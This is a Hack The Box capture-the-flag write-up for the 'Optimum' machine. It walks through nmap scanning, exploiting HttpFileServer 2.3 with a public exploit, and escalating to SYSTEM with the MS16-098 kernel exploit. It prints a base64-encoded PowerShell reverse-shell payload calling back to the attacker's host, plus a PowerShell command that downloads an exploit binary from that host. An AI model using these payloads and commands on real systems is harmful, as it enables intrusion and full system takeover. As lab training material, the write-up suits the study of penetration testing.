# OPTIMUM

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/optimum]
└─$ nmap 10.10.10.8
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-25 02:36 EDT
Nmap scan report for 10.10.10.8
Host is up (0.28s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/optimum]
└─$ nmap 10.10.10.8 -p 80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-25 02:36 EDT
Nmap scan report for 10.10.10.8
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/optimum1.png)

The web server is running `HttpFileServer 2.3`

## EXPLOIT

Searching for exploit using seachsploit

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/optimum]
└─$ searchsploit http file server 2.3      
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execut | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflo | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary F | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remo | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execut | windows/webapps/49125.py
----------------------------------------------------- ---------------------------------
```

We can mirror the first exploit using command `searchsploit -m windows/remote/49584.py`

Opening the exploit in sublime text we have to change the lport and lhost and then we can run the exploit

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/optimum]
└─$ ./49584.py       

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.2
lport:  4444
rhost:  10.10.10.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwANAA0ADQANAApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

Listening for connection...
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.8] 49158
dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                              


PS C:\Users\kostas\Desktop>
```

We can read the user.txt.txt file and get the user flag.

## PRIVESEC

After doing a little search to find tools that can look for vulnerbilities I found [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

It needs the output of command `systeminfo` so I ran the command and copied the output to a file on my machine.

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/Windows-Exploit-Suggester]
└─$ ./windows-exploit-suggester.py --database 2021-09-25-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
...snip...
```

I tried to use the first two expoits but they didn't work so I moved onto the third [exploit](https://www.exploit-db.com/exploits/41020/)

Opening the exploit we see that there is also a [binary](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe) available so I download that.

We can download the binary exploit on target machine using powershell.

```bash
PS C:\Users\kostas\Desktop> powershell -c "(new-object System.Net.Webclient).DownloadFile('http://10.10.14.2:8000/41020.exe','C:\Users\kostas\Desktop\41020.exe')"
PS C:\Users\kostas\Desktop> dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         1/10/2021   8:13 ??     560128 41020.exe                                                                 
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         18/3/2017   2:13 ??         32 user.txt.txt 
```

Executing the binary 

```bash
C:\Users\kostas\Desktop>41020.exe
41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>cd ../../Administrator/Desktop
cd ../../Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D0BC-0196

 Directory of C:\Users\Administrator\Desktop

18/03/2017  03:14 ��    <DIR>          .
18/03/2017  03:14 ��    <DIR>          ..
18/03/2017  03:14 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31.885.099.008 bytes free
```

